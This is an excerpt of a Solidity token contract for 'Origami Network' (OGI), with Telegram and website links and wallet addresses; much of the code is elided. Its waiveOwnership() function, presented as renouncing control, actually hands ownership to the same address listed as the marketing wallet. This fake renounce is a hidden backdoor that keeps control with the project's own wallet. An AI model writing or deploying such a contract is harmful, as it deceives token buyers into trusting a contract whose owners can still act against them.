...
Telegram https://t.me/origaminetworkportal
Website https://origaminetwork.org
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xf2a034012a1666283d3E30dd1717B90dE14F444E);
    }
...
contract OrigamiNetwork is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Origami Network";
    string private _symbol = "OGI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xf2a034012a1666283d3E30dd1717B90dE14F444E);
    address payable public teamWalletAddress = payable(0x277EffCD5A3C45B5f7903b1a38EA4EdE35b425ce);
